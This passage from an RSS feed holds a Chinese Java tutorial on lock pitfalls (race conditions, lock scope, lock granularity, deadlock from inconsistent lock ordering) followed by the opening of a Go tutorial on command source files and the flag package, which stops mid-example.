&lt;p>我先和你分享一个有趣的案例吧。有一天，一位同学在群里说&amp;quot;见鬼了，疑似遇到了一个 JVM 的 Bug&amp;quot;，我们都很好奇是什么 Bug。&lt;/p>
&lt;p>于是，他贴出了这样一段代码：在一个类里有两个 int 类型的字段 a 和 b，有一个 add 方法循环 1 万次对 a 和 b 进行 ++ 操作，有另一个 compare 方法，同样循环 1 万次判断 a 是否小于 b，条件成立就打印 a 和 b 的值，并判断 a&amp;gt;b 是否成立。&lt;/p>
&lt;pre tabindex="0">&lt;code>@Slf4j
public class Interesting {
volatile int a = 1;
volatile int b = 1;
public void add() {
log.info(&amp;#34;add start&amp;#34;);
for (int i = 0; i &amp;lt; 10000; i++) {
a++;
b++;
}
log.info(&amp;#34;add done&amp;#34;);
}
public void compare() {
log.info(&amp;#34;compare start&amp;#34;);
for (int i = 0; i &amp;lt; 10000; i++) {
//a始终等于b吗？
if (a &amp;lt; b) {
log.info(&amp;#34;a:{},b:{},{}&amp;#34;, a, b, a &amp;gt; b);
//最后的a&amp;gt;b应该始终是false吗？
}
}
log.info(&amp;#34;compare done&amp;#34;);
}
}
&lt;/code>&lt;/pre>&lt;p>他起了两个线程来分别执行 add 和 compare 方法：&lt;/p>
&lt;pre tabindex="0">&lt;code>Interesting interesting = new Interesting();
new Thread(() -&amp;gt; interesting.add()).start();
new Thread(() -&amp;gt; interesting.compare()).start();
&lt;/code>&lt;/pre>&lt;p>按道理，a 和 b 同样进行累加操作，应该始终相等，compare 中的第一次判断应该始终不会成立，不会输出任何日志。但，执行代码后发现不但输出了日志，而且更诡异的是，compare 方法在判断 a&amp;lt;b 成立的情况下还输出了 a&amp;gt;b 也成立：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/9e/1d/9ec61aada64ac6d38681dd199c0ee61d.png" alt="">&lt;/p>
&lt;p>群里一位同学看到这个问题笑了，说：&amp;ldquo;这哪是 JVM 的 Bug，分明是线程安全问题嘛。很明显，你这是在操作两个字段 a 和 b，有线程安全问题，应该为 add 方法加上锁，确保 a 和 b 的 ++ 是原子性的，就不会错乱了。&amp;ldquo;随后，他为 add 方法加上了锁：&lt;/p>
&lt;pre tabindex="0">&lt;code>public synchronized void add()
&lt;/code>&lt;/pre>&lt;p>但，加锁后问题并没有解决。&lt;/p>
&lt;p>我们来仔细想一下，为什么锁可以解决线程安全问题呢。因为只有一个线程可以拿到锁，所以加锁后的代码中的资源操作是线程安全的。但是，&lt;strong>这个案例中的 add 方法始终只有一个线程在操作，显然只为 add 方法加锁是没用的&lt;/strong>。&lt;/p>
&lt;p>之所以出现这种错乱，是因为两个线程是交错执行 add 和 compare 方法中的业务逻辑，而且这些业务逻辑不是原子性的：a++ 和 b++ 操作中可以穿插在 compare 方法的比较代码中；更需要注意的是，a&amp;lt;b 这种比较操作在字节码层面是加载 a、加载 b 和比较三步，代码虽然是一行但也不是原子性的。&lt;/p>
&lt;p>所以，正确的做法应该是，为 add 和 compare 都加上方法锁，确保 add 方法执行时，compare 无法读取 a 和 b：&lt;/p>
&lt;pre tabindex="0">&lt;code>public synchronized void add()
public synchronized void compare()
&lt;/code>&lt;/pre>&lt;p>所以，使用锁解决问题之前一定要理清楚，我们要保护的是什么逻辑，多线程执行的情况又是怎样的。&lt;/p>
&lt;h1 id="加锁前要清楚锁和被保护的对象是不是一个层面的">加锁前要清楚锁和被保护的对象是不是一个层面的&lt;/h1>
&lt;p>除了没有分析清线程、业务逻辑和锁三者之间的关系随意添加无效的方法锁外，还有一种比较常见的错误是，没有理清楚锁和要保护的对象是否是一个层面的。&lt;/p>
&lt;p>我们知道&lt;strong>静态字段属于类，类级别的锁才能保护；而非静态字段属于类实例，实例级别的锁就可以保护。&lt;/strong>&lt;/p>
&lt;p>先看看这段代码有什么问题：在类 Data 中定义了一个静态的 int 字段 counter 和一个非静态的 wrong 方法，实现 counter 字段的累加操作。&lt;/p>
&lt;pre tabindex="0">&lt;code>class Data {
@Getter
private static int counter = 0;
public static int reset() {
counter = 0;
return counter;
}
public synchronized void wrong() {
counter++;
}
}
&lt;/code>&lt;/pre>&lt;p>写一段代码测试下：&lt;/p>
&lt;pre tabindex="0">&lt;code>@GetMapping(&amp;#34;wrong&amp;#34;)
public int wrong(@RequestParam(value = &amp;#34;count&amp;#34;, defaultValue = &amp;#34;1000000&amp;#34;) int count) {
Data.reset();
//多线程循环一定次数调用Data类不同实例的wrong方法
IntStream.rangeClosed(1, count).parallel().forEach(i -&amp;gt; new Data().wrong());
return Data.getCounter();
}
&lt;/code>&lt;/pre>&lt;p>因为默认运行 100 万次，所以执行后应该输出 100 万，但页面输出的是 639242：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/77/0b/777f520e9d0be89b66e814d3e7c1a30b.png" alt="">&lt;/p>
&lt;p>我们来分析下为什么会出现这个问题吧。&lt;/p>
&lt;p>在非静态的 wrong 方法上加锁，只能确保多个线程无法执行同一个实例的 wrong 方法，却不能保证不会执行不同实例的 wrong 方法。而静态的 counter 在多个实例中共享，所以必然会出现线程安全问题。&lt;/p>
&lt;p>理清思路后，修正方法就很清晰了：同样在类中定义一个 Object 类型的静态字段，在操作 counter 之前对这个字段加锁。&lt;/p>
&lt;pre tabindex="0">&lt;code>class Data {
@Getter
private static int counter = 0;
private static Object locker = new Object();
public void right() {
synchronized (locker) {
counter++;
}
}
}
&lt;/code>&lt;/pre>&lt;p>你可能要问了，把 wrong 方法定义为静态不就可以了，这个时候锁是类级别的。可以是可以，但我们不可能为了解决线程安全问题改变代码结构，把实例方法改为静态方法。&lt;/p>
&lt;p>感兴趣的同学还可以从字节码以及 JVM 的层面继续探索一下，代码块级别的 synchronized 和方法上标记 synchronized 关键字，在实现上有什么区别。&lt;/p>
&lt;h1 id="加锁要考虑锁的粒度和场景问题">加锁要考虑锁的粒度和场景问题&lt;/h1>
&lt;p>在方法上加 synchronized 关键字实现加锁确实简单，也因此我曾看到一些业务代码中几乎所有方法都加了 synchronized，但这种滥用 synchronized 的做法：&lt;/p>
&lt;ul>
&lt;li>一是，没必要。通常情况下 60% 的业务代码是三层架构，数据经过无状态的 Controller、Service、Repository 流转到数据库，没必要使用 synchronized 来保护什么数据。&lt;/li>
&lt;li>二是，可能会极大地降低性能。使用 Spring 框架时，默认情况下 Controller、Service、Repository 是单例的，加上 synchronized 会导致整个程序几乎就只能支持单线程，造成极大的性能问题。&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>即使我们确实有一些共享资源需要保护，也要尽可能降低锁的粒度，仅对必要的代码块甚至是需要保护的资源本身加锁。&lt;/strong>&lt;/p>
&lt;p>比如，在业务代码中，有一个 ArrayList 因为会被多个线程操作而需要保护，又有一段比较耗时的操作（代码中的 slow 方法）不涉及线程安全问题，应该如何加锁呢？&lt;/p>
&lt;p>错误的做法是，给整段业务逻辑加锁，把 slow 方法和操作 ArrayList 的代码同时纳入 synchronized 代码块；更合适的做法是，把加锁的粒度降到最低，只在操作 ArrayList 的时候给这个 ArrayList 加锁。&lt;/p>
&lt;pre tabindex="0">&lt;code>private List&amp;lt;Integer&amp;gt; data = new ArrayList&amp;lt;&amp;gt;();
//不涉及共享资源的慢方法
private void slow() {
try {
TimeUnit.MILLISECONDS.sleep(10);
} catch (InterruptedException e) {
}
}
//错误的加锁方法
@GetMapping(&amp;#34;wrong&amp;#34;)
public int wrong() {
long begin = System.currentTimeMillis();
IntStream.rangeClosed(1, 1000).parallel().forEach(i -&amp;gt; {
//加锁粒度太粗了
synchronized (this) {
slow();
data.add(i);
}
});
log.info(&amp;#34;took:{}&amp;#34;, System.currentTimeMillis() - begin);
return data.size();
}
//正确的加锁方法
@GetMapping(&amp;#34;right&amp;#34;)
public int right() {
long begin = System.currentTimeMillis();
IntStream.rangeClosed(1, 1000).parallel().forEach(i -&amp;gt; {
slow();
//只对List加锁
synchronized (data) {
data.add(i);
}
});
log.info(&amp;#34;took:{}&amp;#34;, System.currentTimeMillis() - begin);
return data.size();
}
&lt;/code>&lt;/pre>&lt;p>执行这段代码，同样是 1000 次业务操作，正确加锁的版本耗时 1.4 秒，而对整个业务逻辑加锁的话耗时 11 秒。&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/1c/43/1cb278c010719ee00d988dbb2a42c543.png" alt="">&lt;/p>
&lt;p>&lt;strong>如果精细化考虑了锁应用范围后，性能还无法满足需求的话，我们就要考虑另一个维度的粒度问题了，即：区分读写场景以及资源的访问冲突，考虑使用悲观方式的锁还是乐观方式的锁。&lt;/strong>&lt;/p>
&lt;p>一般业务代码中，很少需要进一步考虑这两种更细粒度的锁，所以我只和你分享几个大概的结论，你可以根据自己的需求来考虑是否有必要进一步优化：&lt;/p>
&lt;ul>
&lt;li>对于读写比例差异明显的场景，考虑使用 ReentrantReadWriteLock 细化区分读写锁，来提高性能。&lt;/li>
&lt;li>如果你的 JDK 版本高于 1.8、共享资源的冲突概率也没那么大的话，考虑使用 StampedLock 的乐观读的特性，进一步提高性能。&lt;/li>
&lt;li>JDK 里 ReentrantLock 和 ReentrantReadWriteLock 都提供了公平锁的版本，在没有明确需求的情况下不要轻易开启公平锁特性，在任务很轻的情况下开启公平锁可能会让性能下降上百倍。&lt;/li>
&lt;/ul>
&lt;h1 id="多把锁要小心死锁问题">多把锁要小心死锁问题&lt;/h1>
&lt;p>刚才我们聊到锁的粒度够用就好，这就意味着我们的程序逻辑中有时会存在一些细粒度的锁。但一个业务逻辑如果涉及多把锁，容易产生死锁问题。&lt;/p>
&lt;p>之前我遇到过这样一个案例：下单操作需要锁定订单中多个商品的库存，拿到所有商品的锁之后进行下单扣减库存操作，全部操作完成之后释放所有的锁。代码上线后发现，下单失败概率很高，失败后需要用户重新下单，极大影响了用户体验，还影响到了销量。&lt;/p>
&lt;p>经排查发现是死锁引起的问题，背后原因是扣减库存的顺序不同，导致并发的情况下多个线程可能相互持有部分商品的锁，又等待其他线程释放另一部分商品的锁，于是出现了死锁问题。&lt;/p>
&lt;p>接下来，我们剖析一下核心的业务代码。&lt;/p>
&lt;p>首先，定义一个商品类型，包含商品名、库存剩余和商品的库存锁三个属性，每一种商品默认库存 1000 个；然后，初始化 10 个这样的商品对象来模拟商品清单：&lt;/p>
&lt;pre tabindex="0">&lt;code>@Data
@RequiredArgsConstructor
static class Item {
final String name; //商品名
int remaining = 1000; //库存剩余
@ToString.Exclude //ToString不包含这个字段
ReentrantLock lock = new ReentrantLock();
}
&lt;/code>&lt;/pre>&lt;p>随后，写一个方法模拟在购物车进行商品选购，每次从商品清单（items 字段）中随机选购三个商品（为了逻辑简单，我们不考虑每次选购多个同类商品的逻辑，购物车中不体现商品数量）：&lt;/p>
&lt;pre tabindex="0">&lt;code>private List&amp;lt;Item&amp;gt; createCart() {
return IntStream.rangeClosed(1, 3)
.mapToObj(i -&amp;gt; &amp;#34;item&amp;#34; + ThreadLocalRandom.current().nextInt(items.size()))
.map(name -&amp;gt; items.get(name)).collect(Collectors.toList());
}
&lt;/code>&lt;/pre>&lt;p>下单代码如下：先声明一个 List 来保存所有获得的锁，然后遍历购物车中的商品依次尝试获得商品的锁，最长等待 10 秒，获得全部锁之后再扣减库存；如果有无法获得锁的情况则解锁之前获得的所有锁，返回 false 下单失败。&lt;/p>
&lt;pre tabindex="0">&lt;code>private boolean createOrder(List&amp;lt;Item&amp;gt; order) {
//存放所有获得的锁
List&amp;lt;ReentrantLock&amp;gt; locks = new ArrayList&amp;lt;&amp;gt;();
for (Item item : order) {
try {
//获得锁10秒超时
if (item.lock.tryLock(10, TimeUnit.SECONDS)) {
locks.add(item.lock);
} else {
locks.forEach(ReentrantLock::unlock);
return false;
}
} catch (InterruptedException e) {
}
}
//锁全部拿到之后执行扣减库存业务逻辑
try {
order.forEach(item -&amp;gt; item.remaining--);
} finally {
locks.forEach(ReentrantLock::unlock);
}
return true;
}
&lt;/code>&lt;/pre>&lt;p>我们写一段代码测试这个下单操作。模拟在多线程情况下进行 100 次创建购物车和下单操作，最后通过日志输出成功的下单次数、总剩余的商品个数、100 次下单耗时，以及下单完成后的商品库存明细：&lt;/p>
&lt;pre tabindex="0">&lt;code>@GetMapping(&amp;#34;wrong&amp;#34;)
public long wrong() {
long begin = System.currentTimeMillis();
//并发进行100次下单操作，统计成功次数
long success = IntStream.rangeClosed(1, 100).parallel()
.mapToObj(i -&amp;gt; {
List&amp;lt;Item&amp;gt; cart = createCart();
return createOrder(cart);
})
.filter(result -&amp;gt; result)
.count();
log.info(&amp;#34;success:{} totalRemaining:{} took:{}ms items:{}&amp;#34;,
success,
items.entrySet().stream().map(item -&amp;gt; item.getValue().remaining).reduce(0, Integer::sum),
System.currentTimeMillis() - begin, items);
return success;
}
&lt;/code>&lt;/pre>&lt;p>运行程序，输出如下日志：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/14/05/141a5ed915e08e50c0f6b066bea36e05.png" alt="">&lt;/p>
&lt;p>可以看到，100 次下单操作成功了 65 次，10 种商品总计 10000 件，库存总计为 9805，消耗了 195 件符合预期（65 次下单成功，每次下单包含三件商品），总耗时 50 秒。&lt;/p>
&lt;p>为什么会这样呢？&lt;/p>
&lt;p>使用 JDK 自带的 VisualVM 工具来跟踪一下，重新执行方法后不久就可以看到，线程 Tab 中提示了死锁问题，根据提示点击右侧线程 Dump 按钮进行线程抓取操作：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/ff/ce/ff24ac10bd0635ef4bf5987038b622ce.png" alt="">&lt;/p>
&lt;p>查看抓取出的线程栈，在页面中部可以看到如下日志：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/c3/42/c32cb32eb5433aae3b392738a80bca42.png" alt="">&lt;/p>
&lt;p>显然，&lt;strong>是出现了死锁，线程 4 在等待的一个锁被线程 3 持有，线程 3 在等待的另一把锁被线程 4 持有&lt;/strong>。&lt;/p>
&lt;p>那为什么会有死锁问题呢？&lt;/p>
&lt;p>我们仔细回忆一下购物车添加商品的逻辑，随机添加了三种商品，假设一个购物车中的商品是 item1 和 item2，另一个购物车中的商品是 item2 和 item1，一个线程先获取到了 item1 的锁，同时另一个线程获取到了 item2 的锁，然后两个线程接下来要分别获取 item2 和 item1 的锁，这个时候锁已经被对方获取了，只能相互等待一直到 10 秒超时。&lt;/p>
&lt;p>其实，避免死锁的方案很简单，&lt;strong>为购物车中的商品排一下序，让所有的线程一定是先获取 item1 的锁然后获取 item2 的锁，就不会有问题了&lt;/strong>。所以，我只需要修改一行代码，对 createCart 获得的购物车按照商品名进行排序即可：&lt;/p>
&lt;pre tabindex="0">&lt;code>@GetMapping(&amp;#34;right&amp;#34;)
public long right() {
...
.
long success = IntStream.rangeClosed(1, 100).parallel()
.mapToObj(i -&amp;gt; {
List&amp;lt;Item&amp;gt; cart = createCart().stream()
.sorted(Comparator.comparing(Item::getName))
.collect(Collectors.toList());
return createOrder(cart);
})
.filter(result -&amp;gt; result)
.count();
...
return success;
}
&lt;/code>&lt;/pre>&lt;p>测试一下 right 方法，不管执行多少次都是 100 次成功下单，而且性能相当高，达到了 3000 以上的 TPS：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/a4/e4/a41d077eeecc8b922503409d13a465e4.png" alt="">&lt;/p>
&lt;p>这个案例中，虽然产生了死锁问题，但因为尝试获取锁的操作并不是无限阻塞的，所以没有造成永久死锁，之后的改进就是避免循环等待，通过对购物车的商品进行排序来实现有顺序的加锁，避免循环等待。&lt;/p>
&lt;h1 id="重点回顾">重点回顾&lt;/h1>
&lt;p>我们一起总结回顾下，使用锁来解决多线程情况下线程安全问题的坑吧。&lt;/p>
&lt;p>第一，使用 synchronized 加锁虽然简单，但我们首先要弄清楚共享资源是类还是实例级别的、会被哪些线程操作，synchronized 关联的锁对象或方法又是什么范围的。&lt;/p>
&lt;p>第二，加锁尽可能要考虑粒度和场景，锁保护的代码意味着无法进行多线程操作。对于 Web 类型的天然多线程项目，对方法进行大范围加锁会显著降级并发能力，要考虑尽可能地只为必要的代码块加锁，降低锁的粒度；而对于要求超高性能的业务，还要细化考虑锁的读写场景，以及悲观优先还是乐观优先，尽可能针对明确场景精细化加锁方案，可以在适当的场景下考虑使用 ReentrantReadWriteLock、StampedLock 等高级的锁工具类。&lt;/p>
&lt;p>第三，业务逻辑中有多把锁时要考虑死锁问题，通常的规避方案是，避免无限等待和循环等待。&lt;/p>
&lt;p>此外，&lt;strong>如果业务逻辑中锁的实现比较复杂的话，要仔细看看加锁和释放是否配对，是否有遗漏释放或重复释放的可能性；并且要考虑锁自动超时释放了，而业务逻辑却还在进行的情况下，如果别的线线程或进程拿到了相同的锁，可能会导致重复执行&lt;/strong>。&lt;/p>
&lt;p>为演示方便，今天的案例是在 Controller 的逻辑中开新的线程或使用线程池进行并发模拟，我们当然可以意识到哪些对象是并发操作的。但对于 Web 应用程序的天然多线程场景，你可能更容易忽略这点，并且也可能因为误用锁降低应用整体的吞吐。&lt;strong>如果你的业务代码涉及复杂的锁操作，强烈建议 Mock 相关外部接口或数据库操作后对应用代码进行压测，通过压测排除锁误用带来的性能问题和死锁问题&lt;/strong>。&lt;/p>
&lt;p>今天用到的代码，我都放在了 GitHub 上，你可以点击这个链接查看。&lt;/p>
&lt;h1 id="思考与讨论">思考与讨论&lt;/h1>
&lt;ul>
&lt;li>本文开头的例子里，变量 a、b 都使用了 volatile 关键字，你知道原因吗？我之前遇到过这样一个坑：我们开启了一个线程无限循环来跑一些任务，有一个 bool 类型的变量来控制循环的退出，默认为 true 代表执行，一段时间后主线程将这个变量设置为了 false。如果这个变量不是 volatile 修饰的，子线程可以退出吗？你能否解释其中的原因呢？&lt;/li>
&lt;li>文末我们又提了两个坑，一是加锁和释放没有配对的问题，二是锁自动释放导致的重复逻辑执行的问题。你有什么方法来发现和解决这两种问题吗？&lt;/li>
&lt;/ul>
&lt;p>在使用锁的过程中，你还遇到过其他坑吗？我是朱晔，欢迎在评论区与我留言分享你的想法，也欢迎你把这篇文章分享给你的朋友或同事，一起交流。&lt;/p></description></item><item><title>极客专栏: 02丨命令源码文件</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/go-%E8%AF%AD%E8%A8%80%E6%A0%B8%E5%BF%83-36-%E8%AE%B2/02%E4%B8%A8%E5%91%BD%E4%BB%A4%E6%BA%90%E7%A0%81%E6%96%87%E4%BB%B6/</link><pubDate>Sun, 29 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/go-%E8%AF%AD%E8%A8%80%E6%A0%B8%E5%BF%83-36-%E8%AE%B2/02%E4%B8%A8%E5%91%BD%E4%BB%A4%E6%BA%90%E7%A0%81%E6%96%87%E4%BB%B6/</guid><description>
&lt;p>我们已经知道，环境变量 GOPATH 指向的是一个或多个工作区，每个工作区中都会有以代码包为基本组织形式的源码文件。&lt;/p>
&lt;p>&lt;strong>这里的源码文件又分为三种，即：命令源码文件、库源码文件和测试源码文件，它们都有着不同的用途和编写规则。（&lt;/strong> 我在&lt;a href="https://time.geekbang.org/column/article/13540?utm_source=weibo&amp;amp;utm_medium=xuxiaoping&amp;amp;utm_campaign=promotion&amp;amp;utm_content=columns">&amp;ldquo;预习篇&amp;quot;的基础知识图&lt;/a>介绍过这三种文件的基本情况。）&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/9d/cb/9d08647d238e21e7184d60c0afe5afcb.png" alt="">&lt;/p>
&lt;p>（长按保存大图查看）&lt;/p>
&lt;p>今天，我们就沿着&lt;strong>命令源码文件&lt;/strong>的知识点，展开更深层级的学习。&lt;/p>
&lt;hr>
&lt;p>一旦开始学习用编程语言编写程序，我们就一定希望在编码的过程中及时地得到反馈，只有这样才能清楚对错。实际上，我们的有效学习和进步，都是通过不断地接受反馈和执行修正实现的。&lt;/p>
&lt;p>对于 Go 语言学习者来说，你在学习阶段中，也一定会经常编写可以直接运行的程序。这样的程序肯定会涉及命令源码文件的编写，而且，命令源码文件也可以很方便地用&lt;code>go run&lt;/code>命令启动。&lt;/p>
&lt;p>那么，&lt;strong>我今天的问题就是：命令源码文件的用途是什么，怎样编写它？&lt;/strong>&lt;/p>
&lt;p>这里，我给出你一个&lt;strong>参考的回答&lt;/strong>：命令源码文件是程序的运行入口，是每个可独立运行的程序必须拥有的。我们可以通过构建或安装，生成与其对应的可执行文件，后者一般会与该命令源码文件的直接父目录同名。&lt;/p>
&lt;p>&lt;strong>如果一个源码文件声明属于&lt;code>main&lt;/code>包，并且包含一个无参数声明且无结果声明的&lt;code>main&lt;/code>函数，那么它就是命令源码文件。&lt;/strong> 就像下面这段代码：&lt;/p>
&lt;pre>&lt;code>package main
import &amp;quot;fmt&amp;quot;
func main() {
fmt.Println(&amp;quot;Hello, world!&amp;quot;)
}
&lt;/code>&lt;/pre>
&lt;p>如果你把这段代码存成 demo1.go 文件，那么运行&lt;code>go run demo1.go&lt;/code>命令后就会在屏幕（标准输出）中看到&lt;code>Hello, world!&lt;/code>&lt;/p>
&lt;blockquote>
&lt;p>当需要模块化编程时，我们往往会将代码拆分到多个文件，甚至拆分到不同的代码包中。但无论怎样，对于一个独立的程序来说，命令源码文件永远只会也只能有一个。如果有与命令源码文件同包的源码文件，那么它们也应该声明属于&lt;code>main&lt;/code>包。&lt;/p>
&lt;/blockquote>
&lt;h2 id="问题解析">问题解析&lt;/h2>
&lt;p>命令源码文件如此重要，以至于它毫无疑问地成为了我们学习 Go 语言的第一助手。不过，只会打印&lt;code>Hello, world&lt;/code>是远远不够的，咱们千万不要成为&amp;quot;Hello, world&amp;quot;党。既然决定学习 Go 语言，你就应该从每一个知识点深入下去。&lt;/p>
&lt;p>无论是 Linux 还是 Windows，如果你用过命令行（command line）的话，肯定就会知道几乎所有命令（command）都是可以接收参数（argument）的。通过构建或安装命令源码文件，生成的可执行文件就可以被视为&amp;quot;命令&amp;rdquo;，既然是命令，那么就应该具备接收参数的能力。&lt;/p>
&lt;p>下面，我就带你深入了解一下与命令参数的接收和解析有关的一系列问题。&lt;/p>
&lt;h2 id="知识精讲">知识精讲&lt;/h2>
&lt;h3 id="1-命令源码文件怎样接收参数">1. 命令源码文件怎样接收参数&lt;/h3>
&lt;p>我们先看一段不完整的代码：&lt;/p>
&lt;pre>&lt;code>package main
import (
// 需在此处添加代码。[1]
&amp;quot;fmt&amp;quot;
)
var name string
func init() {
// 需在此处添加代码。[2]
}
func main() {
// 需在此处添加代码。[3]
fmt.Printf(&amp;quot;Hello, %s!\n&amp;quot;, name)
}
&lt;/code>&lt;/pre>
&lt;p>&lt;strong>如果邀请你帮助我，在注释处添加相应的代码，并让程序实现&amp;quot;根据运行程序时给定的参数问候某人&amp;quot;的功能，你会打算怎样做？&lt;/strong>&lt;/p>
&lt;p>如果你知道做法，请现在就动手实现它。如果不知道也不要着急，咱们一起来搞定。&lt;/p>
&lt;p>首先，Go 语言标准库中有一个代码包专门用于接收和解析命令参数。这个代码包的名字叫&lt;code>flag&lt;/code>。&lt;/p>
&lt;p>我之前说过，如果想要在代码中使用某个包中的程序实体，那么应该先导入这个包。因此，我们需要在&lt;code>[1]&lt;/code>处添加代码&lt;code>&amp;quot;flag&amp;quot;&lt;/code>。注意，这里应该在代码包导入路径的前后加上英文半角的引号。如此一来，上述代码导入了&lt;code>flag&lt;/code>和&lt;code>fmt&lt;/code>这两个包。&lt;/p>
&lt;p>其次，人名肯定是由字符串代表的。所以我们要在&lt;code>[2]&lt;/code>处添加调用&lt;code>flag&lt;/code>包的&lt;code>StringVar&lt;/code>函数的代码。就像这样：&lt;/p>
&lt;pre>&lt;code>flag.StringVar(&amp;amp;name, &amp;quot;name&amp;quot;, &amp;quot;everyone&amp;quot;, &amp;quot;The greeting object.&amp;quot;)
&lt;/code>&lt;/pre>
&lt;p>函数&lt;code>flag.StringVar&lt;/code>接受 4 个参数。&lt;/p>
&lt;p>第 1 个参数是用于存储该命令参数值的地址，具体到这里就是在前面声明的变量&lt;code>name&lt;/code>的地址了，由表达式&lt;code>&amp;amp;name&lt;/code>表示。&lt;/p>
&lt;p>第 2 个参数是为了指定该命令参数的名称，这里是&lt;code>name&lt;/code>。&lt;/p>
&lt;p>第 3 个参数是为了指定在未追加该命令参数时的默认值，这里是&lt;code>everyone&lt;/code>。&lt;/p>
&lt;p>至于第 4 个函数参数，即是该命令参数的简短说明了，这在打印命令说明时会用到。&lt;/p>
&lt;p>顺便说一下，还有一个与&lt;code>flag.StringVar&lt;/code>函数类似的函数，叫&lt;code>flag.String&lt;/code>。这两个函数的区别是，后者会直接返回一个已经分配好的用于存储命令参数值的地址。如果使用它的话，我们就需要把&lt;/p>
&lt;pre>&lt;code>var name string
&lt;/code>&lt;/pre>
&lt;p>改为&lt;/p>
&lt;pre>&lt;code>var name = flag.String(&amp;quot;name&amp;quot;, &amp;quot;everyone&amp;quot;, &amp;quot;The greeting object.&amp;quot;)
&lt;/code>&lt;/pre>
&lt;p>所以，如果我们使用&lt;code>flag.String&lt;/code>函数就需要改动原有的代码。这样并不符合上述问题的要求。&lt;/p>
&lt;p>再说最后一个填空。我们需要在&lt;code>[3]&lt;/code>处添加代码&lt;code>flag.Parse()&lt;/code>。函数&lt;code>flag.Parse&lt;/code>用于真正解析命令参数，并把它们的值赋给相应的变量。&lt;/p>
&lt;p>对该函数的调用必须在所有命令参数存储载体的声明（这里是对变量&lt;code>name&lt;/code>的声明）和设置（这里是在&lt;code>[2]&lt;/code>处对&lt;code>flag.StringVar&lt;/code>函数的调用）之后，并且在读取任何命令参数值之前进行。&lt;/p>
&lt;p>正因为如此，我们最好把&lt;code>flag.Parse()&lt;/code>放在&lt;code>main&lt;/code>函数的函数体的第一行。&lt;/p>
&lt;h3 id="2-怎样在运行命令源码文件的时候传入参数又怎样查看参数的使用说明">2. 怎样在运行命令源码文件的时候传入参数，又怎样查看参数的使用说明&lt;/h3>
&lt;p>如果我们把上述代码存成名为 demo2.go 的文件，那么运行如下命令就可以为参数&lt;code>name&lt;/code>传值：&lt;/p>
&lt;pre>&lt;code>go run demo2.go -name=&amp;quot;Robert&amp;quot;
&lt;/code>&lt;/pre>
&lt;p>运行后，打印到标准输出（stdout）的内容会是：&lt;/p>
&lt;pre>&lt;code>Hello, Robert!
&lt;/code>&lt;/pre>
&lt;p>另外，如果想查看该命令源码文件的参数说明，可以这样做：&lt;/p>
&lt;pre>&lt;code>$ go run demo2.go --help
&lt;/code>&lt;/pre>
&lt;p>其中的&lt;code>$&lt;/code>表示我们是在命令提示符后运行&lt;code>go run&lt;/code>命令的。运行后输出的内容会类似：&lt;/p>
&lt;pre>&lt;code>Usage of /var/folders/ts/7lg_tl_x2gd_k1lm5g_48c7w0000gn/T/go-build155438482/b001/exe/demo2:
-name string
The greeting object. (default &amp;quot;everyone&amp;quot;)
exit status 2
&lt;/code>&lt;/pre>
&lt;p>你可能不明白下面这段输出代码的意思。&lt;/p>
&lt;pre>&lt;code>/var/folders/ts/7lg_tl_x2gd_k1lm5g_48c7w0000gn/T/go-build155438482/b001/exe/demo2
&lt;/code>&lt;/pre>
&lt;p>这其实是&lt;code>go run&lt;/code>命令构建上述命令源码文件时临时生成的可执行文件的完整路径。&lt;/p>
&lt;p>如果我们先构建这个命令源码文件再运行生成的可执行文件，像这样：&lt;/p>
&lt;pre>&lt;code>$ go build demo2.go
$ ./demo2 --help
&lt;/code>&lt;/pre>
&lt;p>那么输出就会是&lt;/p>
&lt;pre>&lt;code>Usage of ./demo2:
-name string
The greeting object. (default &amp;quot;everyone&amp;quot;)
&lt;/code>&lt;/pre>
&lt;h3 id="3-怎样自定义命令源码文件的参数使用说明">3. 怎样自定义命令源码文件的参数使用说明&lt;/h3>
&lt;p>这有很多种方式，最简单的一种方式就是对变量&lt;code>flag.Usage&lt;/code>重新赋值。&lt;code>flag.Usage&lt;/code>的类型是&lt;code>func()&lt;/code>，即一种无参数声明且无结果声明的函数类型。&lt;/p>
&lt;p>&lt;code>flag.Usage&lt;/code>变量在声明时就已经被赋值了，所以我们才能够在运行命令&lt;code>go run demo2.go --help&lt;/code>时看到正确的结果。&lt;/p>
&lt;p>注意，对&lt;code>flag.Usage&lt;/code>的赋值必须在调用&lt;code>flag.Parse&lt;/code>函数之前。&lt;/p>
&lt;p>现在，我们把 demo2.go 另存为 demo3.go，然后在&lt;code>main&lt;/code>函数体的开始处加入如下代码。&lt;/p>
&lt;pre>&lt;code>flag.Usage = func() {
fmt.Fprintf(os.Stderr, &amp;quot;Usage of %s:\n&amp;quot;, &amp;quot;question&amp;quot;)
flag.PrintDefaults()
}
&lt;/code>&lt;/pre>
&lt;p>那么当运行&lt;/p>
&lt;pre>&lt;code>$ go run demo3.go --help
&lt;/code>&lt;/pre>
&lt;p>后，就会看到&lt;/p>
&lt;pre>&lt;code>Usage of question:
-name string
The greeting object. (default &amp;quot;everyone&amp;quot;)
exit status 2
&lt;/code>&lt;/pre>
&lt;p>现在再深入一层，我们在调用&lt;code>flag&lt;/code>包中的一些函数（比如&lt;code>StringVar&lt;/code>、&lt;code>Parse&lt;/code>等等）的时候，实际上是在调用&lt;code>flag.CommandLine&lt;/code>变量的对应方法。&lt;/p>
&lt;p>&lt;code>flag.CommandLine&lt;/code>相当于默认情况下的命令参数容器。所以，通过对&lt;code>flag.CommandLine&lt;/code>重新赋值，我们可以更深层次地定制当前命令源码文件的参数使用说明。&lt;/p>
&lt;p>现在我们把&lt;code>main&lt;/code>函数体中的那条对&lt;code>flag.Usage&lt;/code>变量的赋值语句注销掉，然后在&lt;code>init&lt;/code>函数体的开始处添加如下代码：&lt;/p>
&lt;pre>&lt;code>flag.CommandLine = flag.NewFlagSet(&amp;quot;&amp;quot;, flag.ExitOnError)
flag.CommandLine.Usage = func() {
